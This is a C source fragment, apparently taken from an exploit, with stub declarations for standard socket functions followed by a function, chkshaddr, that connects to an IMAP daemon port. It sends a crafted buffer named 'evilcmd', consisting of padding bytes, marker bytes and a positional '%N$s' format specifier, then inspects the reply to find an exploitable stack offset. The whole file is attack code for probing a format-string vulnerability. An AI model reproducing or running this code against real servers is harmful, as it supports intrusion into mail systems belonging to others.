
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct in_addr {int dummy; } ;
struct sockaddr_in {char sin_zero; struct in_addr sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {scalar_t__ h_addr; } ;
typedef int recvbuf ;
typedef int evilcmd ;


 int AF_INET ;
 int BUFFERSIZE ;
 int SOCK_STREAM ;
 int TIMEOUT ;
 int bzero (char*,int) ;
 int close (int) ;
 int connect_timeout (int,struct sockaddr*,int,int ) ;
 struct hostent* gethostbyname (char*) ;
 int htons (unsigned int) ;
 int memset (char*,int,int) ;
 int read (int,char*,int) ;
 int socket (int ,int ,int ) ;
 int sprintf (char*,char*,int) ;
 int strcat (char*,char*) ;
 int strlen (char*) ;
 scalar_t__ strstr (char*,char*) ;
 int write (int,char*,int ) ;

int chkshaddr(char *host, unsigned int imapdport, int i) {
 char recvbuf[BUFFERSIZE], evilcmd[BUFFERSIZE], temp[BUFFERSIZE],*addr=((void*)0);
 struct hostent *he;
 struct sockaddr_in dest_dir;
 int sockfd;

 he=gethostbyname(host);

 bzero(recvbuf, sizeof(recvbuf));

 sockfd=socket(AF_INET, SOCK_STREAM, 0);

 dest_dir.sin_family = AF_INET;
 dest_dir.sin_port = htons(imapdport);
 dest_dir.sin_addr = *((struct in_addr *)he->h_addr);
 bzero(&(dest_dir.sin_zero), 8);

 connect_timeout(sockfd, (struct sockaddr *)&dest_dir,
  sizeof(struct sockaddr), TIMEOUT);

 read(sockfd, recvbuf, sizeof(recvbuf));

 memset(evilcmd, 0x00, sizeof(evilcmd));
 memset(evilcmd, 0x41, 496);
 strcat(evilcmd, "BBBBBBBBBBBB");
 sprintf(temp, "%%%u$s\n", i);
 strcat(evilcmd, temp);

 write(sockfd, evilcmd, strlen(evilcmd));
 read(sockfd, recvbuf, sizeof(recvbuf));

 close(sockfd);

 if(strstr(recvbuf, "$s")) return 1;

 else return 0;
}
